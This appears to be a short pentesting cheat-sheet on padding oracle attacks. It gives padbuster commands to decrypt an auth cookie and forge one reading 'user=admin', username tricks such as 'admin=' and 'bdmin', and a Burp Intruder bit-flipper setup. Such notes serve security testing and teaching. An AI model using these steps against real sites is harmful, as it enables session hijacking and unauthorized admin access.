A padding oracle attack is an attack which uses the padding validation of a cryptographic message to decrypt the ciphertext.

# Padbuster
A padding oracle attack is an attack which uses the padding validation of a cryptographic message to decrypt the ciphertext.

We can use **padbuster** to decode a cookie and try to do a cookie hijacking:
```console
$ padbuster [url] 8 -cookie "auth=[cookie]" -encoding 0
```

If it is vulnerable, we can encrypt new cookies. For example if the output is 'user=youruser' we can try:
```console
$ padbuster [url] 8 -cookie "auth=[cookie]" -encoding 0 -plaintext "user=admin"
```

Another way to recretate this if we can register a new user and login, we can create a user like **admin=**. This will create an user with the same privilegies as the user admin.

# Bit Flipper Attack / BurpSuite
Another way is to register a new user like **bdmin**. Send the request to the **Intruder**.
Then we can use the following payload: *type: Bit flipper, Format of original data: Literal value, URL encode: disable*
